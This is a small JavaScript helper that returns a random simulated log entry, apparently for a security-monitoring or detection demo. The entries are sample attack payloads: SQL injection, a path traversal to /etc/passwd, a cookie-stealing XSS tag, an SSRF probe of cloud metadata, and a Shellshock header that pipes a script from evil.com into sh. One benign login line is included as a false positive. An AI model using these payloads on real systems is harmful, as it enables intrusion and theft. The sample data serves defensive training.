export const getRandomLog = () => {
  const logs = [
    // SQL Injection
    "SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
    // Local File Inclusion
    "GET /images/view?file=../../../../etc/passwd HTTP/1.1",
    // Cross-Site Scripting (XSS)
    "POST /comments body: <img src=x onerror=alert(document.cookie)>",
    // Server-Side Request Forgery (SSRF) - спроба доступу до метаданих AWS
    "GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1",
    // Command Injection (Shellshock style)
    "User-Agent: () { :; }; /bin/bash -c \"curl http://evil.com/shell.sh | sh\"",
    // Звичайна активність (False Positive)
    "Successful login for user 'johndoe' from IP 192.168.1.15"
  ];
  return logs[Math.floor(Math.random() * logs.length)];
};